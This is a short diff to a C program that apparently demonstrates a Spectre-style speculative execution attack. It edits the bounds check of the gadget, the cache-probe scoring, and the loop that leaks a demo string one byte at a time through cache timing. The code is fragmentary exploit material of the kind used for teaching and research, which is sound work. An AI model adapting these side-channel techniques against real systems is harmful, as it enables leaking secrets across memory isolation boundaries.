@@ -22,7 +22,7 @@ void do_speculative_execution(size_t index)
     _mm_clflush(array);
     for (volatile int z = 0; z < 100; z++);
     
-    if (index < 16)
+    if (index < sizeof(array))
     {
         mem_pages[array[index]][0] = 0;
     }
@@ -88,7 +88,9 @@ uint8_t get_best_result(int results[256])
             ret = i;
         }
     }
-    printf("%c, score: %d\n", ret, results[ret]);
+
+    if(ret < 32 || ret > 126) ret = 'x';
+    //printf("%c, score: %d\n", ret, results[ret]);
     return ret;
 }
 
@@ -112,7 +114,7 @@ uint8_t probe(uint8_t* target)
     return get_best_result(results);
 }
 
-char *secret = "Hello, this is Abu coding";
+char *secret = "Hello, Abu Coding";
 
 int getStringLength(char *str) {
     int length = 0;
@@ -130,8 +132,9 @@ int main()
 
     for(int i = 0; i < len; i++)
     {
-        char value = probe(secret++);
+        printf("%c", probe(secret++));
     }
+    printf("\n");
 }
 
 /*
